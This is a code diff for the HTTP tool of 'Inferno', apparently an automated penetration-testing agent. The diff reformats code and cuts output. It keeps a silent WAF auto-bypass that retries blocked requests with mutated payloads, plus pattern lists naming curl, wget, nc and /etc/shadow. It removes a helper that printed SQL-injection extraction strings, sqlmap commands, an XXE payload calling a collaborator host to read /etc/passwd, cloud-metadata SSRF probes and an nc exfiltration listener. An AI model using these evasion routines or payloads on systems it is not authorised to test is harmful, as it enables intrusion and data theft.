@@ -93,6 +93,7 @@ def _get_max_response_size() -> int:
     """Get max response size from settings or use default."""
     try:
         from inferno.config.settings import InfernoSettings
+
         settings = InfernoSettings()
         return settings.execution.max_response_size
     except Exception:
@@ -103,6 +104,7 @@ def _should_warn_truncation() -> bool:
     """Check if truncation warnings are enabled."""
     try:
         from inferno.config.settings import InfernoSettings
+
         settings = InfernoSettings()
         return settings.execution.truncation_warning
     except Exception:
@@ -283,6 +285,7 @@ class HTTPTool(CoreTool):
         if self._smart_router is None and self._enable_smart_routing:
             try:
                 from inferno.core.smart_router import SmartRequestRouter
+
                 self._smart_router = SmartRequestRouter()
             except Exception as e:
                 logger.warning("smart_router_init_failed", error=str(e))
@@ -292,6 +295,7 @@ class HTTPTool(CoreTool):
         """Get the global network manager."""
         if self._network_manager is None:
             from inferno.core.network import get_network_manager
+
             self._network_manager = get_network_manager()
         return self._network_manager
 
@@ -304,9 +308,7 @@ class HTTPTool(CoreTool):
                     cls._shared_client = httpx.AsyncClient(
                         timeout=httpx.Timeout(30.0, connect=10.0),
                         limits=httpx.Limits(
-                            max_connections=100,
-                            max_keepalive_connections=20,
-                            keepalive_expiry=30.0
+                            max_connections=100, max_keepalive_connections=20, keepalive_expiry=30.0
                         ),
                         follow_redirects=True,
                         http2=True,  # Enable HTTP/2 for better performance
@@ -423,6 +425,7 @@ class HTTPTool(CoreTool):
 
         try:
             import time
+
             request_start_time = time.time()
 
             # Use NetworkManager for coordinated rate limiting and proxy rotation
@@ -485,7 +488,9 @@ class HTTPTool(CoreTool):
                         was_truncated = True
                         formatted = formatted[:max_size]
                         if warn_truncation:
-                            output_parts.append(f"\nWARNING: Response truncated from {original_size:,} to {max_size:,} bytes. Important data may be missing!")
+                            output_parts.append(
+                                f"\nWARNING: Response truncated from {original_size:,} to {max_size:,} bytes. Important data may be missing!"
+                            )
                         formatted += "\n[TRUNCATED - see warning above]"
                     output_parts.append(f"Body (JSON):\n{formatted}")
                 except json.JSONDecodeError:
@@ -496,10 +501,14 @@ class HTTPTool(CoreTool):
                         was_truncated = True
                         body_text = body_text[:max_size]
                         if warn_truncation:
-                            output_parts.append(f"\nWARNING: Response truncated from {original_size:,} to {max_size:,} bytes. Important data may be missing!")
+                            output_parts.append(
+                                f"\nWARNING: Response truncated from {original_size:,} to {max_size:,} bytes. Important data may be missing!"
+                            )
                         body_text += "\n[TRUNCATED - see warning above]"
                     output_parts.append(f"Body:\n{body_text}")
-            elif any(t in content_type for t in ["text/", "application/xml", "application/javascript"]):
+            elif any(
+                t in content_type for t in ["text/", "application/xml", "application/javascript"]
+            ):
                 body_text = response.text
                 response_text = body_text
                 original_size = len(body_text)
@@ -507,13 +516,17 @@ class HTTPTool(CoreTool):
                     was_truncated = True
                     body_text = body_text[:max_size]
                     if warn_truncation:
-                        output_parts.append(f"\nWARNING: Response truncated from {original_size:,} to {max_size:,} bytes. Important data may be missing!")
+                        output_parts.append(
+                            f"\nWARNING: Response truncated from {original_size:,} to {max_size:,} bytes. Important data may be missing!"
+                        )
                     body_text += "\n[TRUNCATED - see warning above]"
                 output_parts.append(f"Body:\n{body_text}")
             else:
                 # Binary content
                 content_length = len(response.content)
-                output_parts.append(f"Body: Binary content ({content_length} bytes, type: {content_type})")
+                output_parts.append(
+                    f"Body: Binary content ({content_length} bytes, type: {content_type})"
+                )
 
             # Perform CDN and geo-restriction detection
             detection_warnings = []
@@ -576,11 +589,13 @@ class HTTPTool(CoreTool):
                         logger.warning("detection_failed", error=str(e))
 
             # =================================================================
-            # INTELLIGENCE EXTRACTION - Makes Inferno smarter at finding bugs
+            # INTELLIGENCE EXTRACTION (runs in background, minimal output)
+            # Set INFERNO_VERBOSE_INTEL=true for full output (debugging only)
             # =================================================================
             intelligence_output = []
+            verbose_intel = os.getenv("INFERNO_VERBOSE_INTEL", "false").lower() == "true"
 
-            # 1. Extract hints from response (technology fingerprints, CTF hints, etc.)
+            # 1. Extract hints from response (stored in metadata for learning, not output)
             try:
                 hint_extractor = HintExtractor()
                 hints = hint_extractor.extract_from_response(
@@ -591,26 +606,7 @@ class HTTPTool(CoreTool):
                 )
 
                 if hints:
-                    # Sort by priority (critical first)
-                    priority_order = {
-                        HintPriority.CRITICAL: 0,
-                        HintPriority.HIGH: 1,
-                        HintPriority.MEDIUM: 2,
-                        HintPriority.LOW: 3,
-                    }
-                    hints = sorted(hints, key=lambda h: priority_order.get(h.priority, 4))
-
-                    intelligence_output.append("=== INTELLIGENCE EXTRACTED ===")
-                    for hint in hints[:10]:  # Limit to top 10 hints
-                        intelligence_output.append(
-                            f"  [{hint.priority.value.upper()}] {hint.hint_type.value}: {hint.content}"
-                        )
-                        if hint.suggested_attacks:
-                            intelligence_output.append(
-                                f"    → Try: {', '.join(hint.suggested_attacks[:5])}"
-                            )
-
-                    # Store hints in metadata for learning
+                    # Store hints in metadata for algorithm learning (no output)
                     metadata["hints"] = [
                         {
                             "type": h.hint_type.value,
@@ -618,19 +614,32 @@ class HTTPTool(CoreTool):
                             "content": h.content,
                             "attacks": h.suggested_attacks,
                         }
-                        for h in hints[:10]
+                        for h in hints[:5]  # Reduced from 10
                     ]
 
-                    logger.info(
+                    # Only output in verbose mode
+                    if verbose_intel:
+                        priority_order = {
+                            HintPriority.CRITICAL: 0,
+                            HintPriority.HIGH: 1,
+                            HintPriority.MEDIUM: 2,
+                            HintPriority.LOW: 3,
+                        }
+                        hints = sorted(hints, key=lambda h: priority_order.get(h.priority, 4))
+                        intelligence_output.append("=== HINTS ===")
+                        for hint in hints[:3]:
+                            intelligence_output.append(
+                                f"  [{hint.priority.value.upper()}] {hint.content}"
+                            )
+
+                    logger.debug(
                         "hints_extracted",
                         count=len(hints),
-                        critical=sum(1 for h in hints if h.priority == HintPriority.CRITICAL),
-                        high=sum(1 for h in hints if h.priority == HintPriority.HIGH),
                     )
             except Exception as e:
                 logger.warning("hint_extraction_failed", error=str(e))
 
-            # 2. Analyze blocked responses (WAF detection, bypass suggestions)
+            # 2. Analyze blocked responses (WAF detection) - minimal output
             if response.status_code in (403, 406, 429, 503, 401):
                 try:
                     response_analyzer = ResponseAnalyzer()
@@ -642,120 +651,102 @@ class HTTPTool(CoreTool):
                     )
 
                     if block_analysis.is_blocked:
-                        intelligence_output.append("")
-                        intelligence_output.append("=== BLOCK ANALYSIS ===")
-                        intelligence_output.append(f"  Status: BLOCKED ({response.status_code})")
-
+                        # Store in metadata for learning (always)
                         if block_analysis.waf_type:
-                            intelligence_output.append(f"  WAF Detected: {block_analysis.waf_type}")
                             metadata["waf_detected"] = block_analysis.waf_type
-
                         if block_analysis.block_type:
-                            intelligence_output.append(f"  Block Type: {block_analysis.block_type}")
                             metadata["block_type"] = block_analysis.block_type
-
-                        if block_analysis.blocked_pattern:
-                            intelligence_output.append(f"  Blocked Pattern: {block_analysis.blocked_pattern}")
-
                         if block_analysis.suggested_bypasses:
-                            intelligence_output.append("  Suggested Bypasses:")
-                            for bypass in block_analysis.suggested_bypasses[:7]:
-                                intelligence_output.append(f"    • {bypass}")
-                            metadata["bypass_suggestions"] = block_analysis.suggested_bypasses[:7]
+                            metadata["bypass_suggestions"] = block_analysis.suggested_bypasses[:3]
 
-                        logger.info(
-                            "block_analyzed",
-                            waf=block_analysis.waf_type,
-                            block_type=block_analysis.block_type,
-                            bypasses=len(block_analysis.suggested_bypasses) if block_analysis.suggested_bypasses else 0,
+                        # Minimal output: just one line for WAF
+                        waf_info = (
+                            f" ({block_analysis.waf_type.value})" if block_analysis.waf_type else ""
+                        )
+                        intelligence_output.append(
+                            f"[BLOCKED{waf_info}] Try encoding/case variation"
                         )
 
-                        # ============================================================
-                        # AUTO-BYPASS: Try PayloadMutator to bypass the WAF
-                        # ============================================================
-                        auto_bypass_enabled = os.getenv("INFERNO_AUTO_BYPASS", "true").lower() != "false"
+                        logger.debug("block_analyzed", waf=block_analysis.waf_type)
+
+                        # Auto-bypass runs silently, only outputs on success
+                        auto_bypass_enabled = (
+                            os.getenv("INFERNO_AUTO_BYPASS", "true").lower() != "false"
+                        )
                         original_payload = body or json_body or form_data
                         if auto_bypass_enabled and original_payload:
                             try:
                                 from inferno.core.payload_mutator import get_payload_mutator
-                                mutator = get_payload_mutator()
 
-                                # Detect payload context
+                                mutator = get_payload_mutator()
                                 payload_str = str(original_payload)
                                 context = self._detect_payload_context(payload_str)
-                                waf_type_str = block_analysis.waf_type.value if block_analysis.waf_type else None
+                                waf_type_str = (
+                                    block_analysis.waf_type.value
+                                    if block_analysis.waf_type
+                                    else None
+                                )
 
                                 mutation_result = mutator.mutate(
                                     payload=payload_str,
                                     context=context,
-                                    max_mutations=5,
+                                    max_mutations=3,
                                     waf_type=waf_type_str,
                                 )
 
-                                if mutation_result.mutations:
-                                    intelligence_output.append("")
-                                    intelligence_output.append("=== AUTO-BYPASS ATTEMPTS ===")
+                                for mutation in mutation_result.mutations[:3]:
+                                    try:
+                                        retry_body = mutation.mutated if body else None
+                                        retry_json = mutation.mutated if json_body else None
+                                        retry_form = mutation.mutated if form_data else None
 
-                                    for i, mutation in enumerate(mutation_result.mutations[:3]):
-                                        intelligence_output.append(f"  Attempt {i+1}: {mutation.mutation_type.value}")
-                                        intelligence_output.append(f"    Payload: {mutation.mutated[:80]}{'...' if len(mutation.mutated) > 80 else ''}")
+                                        shared_client = await self.get_shared_client()
+                                        retry_response = await shared_client.request(
+                                            method=method,
+                                            url=url,
+                                            headers=headers,
+                                            content=retry_body.encode() if retry_body else None,
+                                            json=json.loads(retry_json)
+                                            if retry_json and retry_json.startswith("{")
+                                            else None,
+                                            data=retry_form if retry_form else None,
+                                            timeout=timeout,
+                                            follow_redirects=follow_redirects,
+                                        )
 
-                                        try:
-                                            # Retry with mutated payload
-                                            retry_body = mutation.mutated if body else None
-                                            retry_json = mutation.mutated if json_body else None
-                                            retry_form = mutation.mutated if form_data else None
-
-                                            # Use class method to get shared client (fixes AttributeError)
-                                            shared_client = await self.get_shared_client()
-                                            retry_response = await shared_client.request(
-                                                method=method,
-                                                url=url,
-                                                headers=headers,
-                                                content=retry_body.encode() if retry_body else None,
-                                                json=json.loads(retry_json) if retry_json and retry_json.startswith('{') else None,
-                                                data=retry_form if retry_form else None,
-                                                timeout=timeout,
-                                                follow_redirects=follow_redirects,
+                                        if retry_response.status_code not in (403, 406, 429, 503):
+                                            mutator.record_result(
+                                                payload_str, mutation.mutated, success=True
                                             )
-
-                                            if retry_response.status_code not in (403, 406, 429, 503):
-                                                # SUCCESS!
-                                                mutator.record_result(payload_str, mutation.mutated, success=True)
-                                                intelligence_output.append(f"    [SUCCESS] Bypass worked! Status: {retry_response.status_code}")
-                                                metadata["auto_bypass_succeeded"] = True
-                                                metadata["successful_mutation"] = mutation.mutation_type.value
-
-                                                # Update response to the successful one
-                                                response = retry_response
-                                                response_text = response.text
-
-                                                logger.info(
-                                                    "http_auto_bypass_success",
-                                                    mutation_type=mutation.mutation_type.value,
-                                                    new_status=retry_response.status_code,
-                                                )
-                                                break
-                                            else:
-                                                intelligence_output.append(f"    [FAILED] Still blocked ({retry_response.status_code})")
-                                                mutator.record_result(payload_str, mutation.mutated, success=False)
-
-                                        except Exception as retry_error:
-                                            intelligence_output.append(f"    [ERROR] {retry_error}")
-
+                                            intelligence_output.append(
+                                                f"[BYPASS OK] {mutation.mutation_type.value} → {retry_response.status_code}"
+                                            )
+                                            metadata["auto_bypass_succeeded"] = True
+                                            metadata["successful_mutation"] = (
+                                                mutation.mutation_type.value
+                                            )
+                                            response = retry_response
+                                            response_text = response.text
+                                            logger.info(
+                                                "http_auto_bypass_success",
+                                                mutation_type=mutation.mutation_type.value,
+                                            )
+                                            break
+                                        else:
+                                            mutator.record_result(
+                                                payload_str, mutation.mutated, success=False
+                                            )
+                                    except Exception:
+                                        pass
                             except Exception as bypass_error:
-                                logger.warning("http_auto_bypass_failed", error=str(bypass_error))
-                        # ============================================================
+                                logger.debug("http_auto_bypass_failed", error=str(bypass_error))
 
                 except Exception as e:
                     logger.warning("block_analysis_failed", error=str(e))
 
-            # 3. Differential Analysis for blind injection detection
-            # Compares this response against stored baseline to detect subtle changes
+            # 3. Differential Analysis - runs in background, minimal output
             try:
                 diff_analyzer = get_differential_analyzer()
-
-                # Create fingerprint for this response
                 response_time = elapsed_time if elapsed_time > 0 else 0.1
                 current_fingerprint = ResponseFingerprint.from_response(
                     url=str(response.url),
@@ -765,15 +756,11 @@ class HTTPTool(CoreTool):
                     response_time=response_time,
                 )
 
-                # Generate baseline key from URL path + method
                 parsed = urlparse(str(response.url))
                 baseline_key = f"{method}:{parsed.path}"
-
-                # Check if we have a baseline to compare against
                 baseline = diff_analyzer.get_baseline(baseline_key)
 
                 if baseline:
-                    # Compare against baseline (payload context from body/params)
                     payload_context = ""
                     if body:
                         payload_context = body[:100] if isinstance(body, str) else str(body)[:100]
@@ -788,72 +775,49 @@ class HTTPTool(CoreTool):
                         payload_context=payload_context,
                     )
 
-                    # Only show differential analysis for high-significance differences
-                    # to reduce false positives and avoid wasting tokens
-                    if diff_result.is_different and diff_result.overall_significance >= 0.6:
-                        intelligence_output.append("")
-                        intelligence_output.append("=== DIFFERENTIAL ANALYSIS (Blind Injection Potential) ===")
-                        intelligence_output.append(f"  Significance: {diff_result.overall_significance:.0%}")
-                        intelligence_output.append(f"  Likely Vulnerability: {diff_result.likely_vulnerability.value}")
-
-                        for diff in diff_result.differences[:5]:
-                            intelligence_output.append(
-                                f"  [{diff.diff_type.value.upper()}] {diff.description}"
-                            )
-
-                        if diff_result.recommendation:
-                            intelligence_output.append(f"  → {diff_result.recommendation}")
-
-                        # ============================================================
-                        # ACTIONABLE FOLLOW-UPS based on vulnerability type
-                        # ============================================================
-                        vuln_type = diff_result.likely_vulnerability.value
-                        follow_ups = self._generate_vuln_follow_ups(vuln_type, str(response.url), payload_context)
-                        if follow_ups:
-                            intelligence_output.append("")
-                            intelligence_output.append("=== IMMEDIATE NEXT STEPS (DO THESE NOW) ===")
-                            for i, follow_up in enumerate(follow_ups, 1):
-                                intelligence_output.append(f"  {i}. {follow_up}")
-
+                    # Only output for very high significance (0.7+), one line only
+                    if diff_result.is_different and diff_result.overall_significance >= 0.7:
+                        intelligence_output.append(
+                            f"[DIFF] {diff_result.likely_vulnerability.value} potential ({diff_result.overall_significance:.0%})"
+                        )
+                        # Store in metadata for learning
                         metadata["differential_analysis"] = {
-                            "is_different": True,
                             "significance": diff_result.overall_significance,
                             "likely_vuln": diff_result.likely_vulnerability.value,
-                            "recommendation": diff_result.recommendation,
                         }
-
-                        logger.info(
-                            "differential_analysis_detected",
-                            significance=diff_result.overall_significance,
-                            likely_vuln=diff_result.likely_vulnerability.value,
-                            differences=len(diff_result.differences),
+                        logger.debug(
+                            "differential_detected", vuln=diff_result.likely_vulnerability.value
                         )
                 else:
-                    # Store this response as baseline for future comparison
-                    # Only store baselines for clean requests (no obvious payloads)
+                    # Store baseline for clean requests
                     has_payload = any(
                         indicator in str(body or "") + str(json_body or "") + str(form_data or "")
-                        for indicator in ["'", '"', "<", ">", "{{", "}}", "SLEEP", "SELECT", "UNION"]
+                        for indicator in [
+                            "'",
+                            '"',
+                            "<",
+                            ">",
+                            "{{",
+                            "}}",
+                            "SLEEP",
+                            "SELECT",
+                            "UNION",
+                        ]
                     )
                     if not has_payload:
                         diff_analyzer.store_baseline(baseline_key, current_fingerprint)
-                        logger.debug("baseline_stored", key=baseline_key)
 
             except Exception as e:
-                logger.warning("differential_analysis_failed", error=str(e))
+                logger.debug("differential_analysis_failed", error=str(e))
 
             # Prepend intelligence to output
             if intelligence_output:
                 intelligence_output.append("")  # Blank line separator
                 output_parts = intelligence_output + output_parts
 
-            # Add detection warnings to output
-            if detection_warnings:
-                output_parts.insert(0, "")
-                output_parts.insert(0, "=== DETECTION ALERTS ===")
-                for warning in detection_warnings:
-                    output_parts.insert(1, f"  {warning}")
-                output_parts.insert(len(detection_warnings) + 2, "")
+            # Add detection warnings (minimal - only in verbose mode)
+            if detection_warnings and verbose_intel:
+                output_parts.insert(0, f"[ALERT] {'; '.join(detection_warnings[:2])}")
 
             output = "\n".join(output_parts)
 
@@ -927,116 +891,86 @@ class HTTPTool(CoreTool):
 
         # SQL injection indicators
         sql_patterns = [
-            "select", "union", "insert", "update", "delete", "drop",
-            "' or", "' and", "1=1", "1'='1", "--", "/*", "*/",
-            "sleep(", "waitfor", "benchmark(", "pg_sleep",
+            "select",
+            "union",
+            "insert",
+            "update",
+            "delete",
+            "drop",
+            "' or",
+            "' and",
+            "1=1",
+            "1'='1",
+            "--",
+            "/*",
+            "*/",
+            "sleep(",
+            "waitfor",
+            "benchmark(",
+            "pg_sleep",
         ]
         if any(p in payload_lower for p in sql_patterns):
             return "sql"
 
         # XSS indicators
         xss_patterns = [
-            "<script", "javascript:", "onerror", "onload", "onclick",
-            "alert(", "confirm(", "prompt(", "<img", "<svg", "<body",
-            "document.", "window.", "eval(",
+            "<script",
+            "javascript:",
+            "onerror",
+            "onload",
+            "onclick",
+            "alert(",
+            "confirm(",
+            "prompt(",
+            "<img",
+            "<svg",
+            "<body",
+            "document.",
+            "window.",
+            "eval(",
         ]
         if any(p in payload_lower for p in xss_patterns):
             return "xss"
 
         # Command injection indicators
         cmd_patterns = [
-            "; ", "| ", "& ", "` ", "$(", "${", "||", "&&",
-            "/bin/", "/etc/", "cat ", "ls ", "id;", "whoami",
-            "ping ", "curl ", "wget ", "nc ", "bash ", "sh ",
+            "; ",
+            "| ",
+            "& ",
+            "` ",
+            "$(",
+            "${",
+            "||",
+            "&&",
+            "/bin/",
+            "/etc/",
+            "cat ",
+            "ls ",
+            "id;",
+            "whoami",
+            "ping ",
+            "curl ",
+            "wget ",
+            "nc ",
+            "bash ",
+            "sh ",
         ]
         if any(p in payload_lower for p in cmd_patterns):
             return "cmd"
 
         # Path traversal indicators
         path_patterns = [
-            "../", "..\\", "%2e%2e", "/etc/passwd", "/etc/shadow",
-            "windows/system32", "boot.ini", "..%2f", "..%5c",
+            "../",
+            "..\\",
+            "%2e%2e",
+            "/etc/passwd",
+            "/etc/shadow",
+            "windows/system32",
+            "boot.ini",
+            "..%2f",
+            "..%5c",
         ]
         if any(p in payload_lower for p in path_patterns):
             return "path"
 
         return "generic"
-
-    def _generate_vuln_follow_ups(self, vuln_type: str, url: str, payload_context: str) -> list[str]:
-        """
-        Generate specific actionable follow-ups based on detected vulnerability type.
-
-        Args:
-            vuln_type: The vulnerability indicator type (from DifferentialAnalyzer)
-            url: The target URL
-            payload_context: The payload that triggered the detection
-
-        Returns:
-            List of specific commands/actions to take next
-        """
-        follow_ups: list[str] = []
-
-        if vuln_type == "blind_sqli":
-            follow_ups = [
-                "CONFIRM with time-based: Try `' AND SLEEP(5)--` and measure response time (should take 5+ seconds)",
-                "CONFIRM with boolean: Compare `' AND '1'='1` (true) vs `' AND '1'='2` (false) - responses should differ",
-                "If confirmed, EXTRACT version: `' AND SUBSTRING(@@version,1,1)='5'--`",
-                "Run sqlmap: `sqlmap -u '{url}' --batch --technique=B --level=3`",
-            ]
-        elif vuln_type == "boolean_based":
-            follow_ups = [
-                "VERIFY: Send `' AND '1'='1` - should return NORMAL response",
-                "VERIFY: Send `' AND '1'='2` - should return DIFFERENT response (error/empty)",
-                "If both verify, DB is confirmed injectable. EXTRACT data:",
-                "  - Database: `' AND SUBSTRING(database(),1,1)='a'--` (iterate through chars)",
-                "  - Use sqlmap: `sqlmap -u '{url}' --batch --technique=B --dbs`",
-            ]
-        elif vuln_type == "time_based":
-            follow_ups = [
-                "CONFIRMED timing side-channel. Now EXTRACT data with conditional delays:",
-                "  - `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--` (char by char)",
-                "  - `'; WAITFOR DELAY '00:00:05'--` (MSSQL variant)",
-                "Use sqlmap for automated extraction: `sqlmap -u '{url}' --batch --technique=T --time-sec=3`",
-            ]
-        elif vuln_type == "error_based":
-            follow_ups = [
-                "EXTRACT data via error messages:",
-                "  - MySQL: `' AND extractvalue(1,concat(0x7e,(SELECT database())))--`",
-                "  - MSSQL: `' AND 1=convert(int,(SELECT @@version))--`",
-                "  - PostgreSQL: `' AND 1=cast((SELECT version()) as int)--`",
-                "Use sqlmap: `sqlmap -u '{url}' --batch --technique=E`",
-            ]
-        elif vuln_type == "blind_xxe":
-            follow_ups = [
-                "CONFIRM with OOB callback: Use your Burp Collaborator or webhook.site",
-                "Payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://YOUR-COLLABORATOR-URL'>]><foo>&xxe;</foo>`",
-                "If callback received, EXTRACT files: `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>`",
-                "Try parameter entity for data exfil if direct fails",
-            ]
-        elif vuln_type == "blind_ssrf":
-            follow_ups = [
-                "CONFIRM with OOB callback to YOUR server/Collaborator",
-                "Test internal ports: `http://127.0.0.1:22`, `http://127.0.0.1:6379` (Redis)",
-                "Test cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS)",
-                "Test internal hosts: `http://localhost`, `http://internal-service`",
-            ]
-        elif vuln_type == "out_of_band":
-            follow_ups = [
-                "OOB channel confirmed! Set up callback listener:",
-                "  - Burp Collaborator (recommended)",
-                "  - webhook.site (free, quick)",
-                "  - Your VPS with `nc -lvnp 80`",
-                "Modify payload to exfiltrate data via DNS/HTTP to your listener",
-            ]
-        else:
-            # Generic follow-ups for unknown vulnerability type
-            follow_ups = [
-                "Anomaly detected but type unclear. Try these:",
-                "  - Repeat the request to confirm it's consistent",
-                "  - Vary the payload slightly and compare responses",
-                "  - Check for timing differences with SLEEP payloads",
-                "  - Set up OOB callback to detect blind interactions",
-            ]
-
-        # Replace {url} placeholder with actual URL
-        return [f.replace("{url}", url) for f in follow_ups]
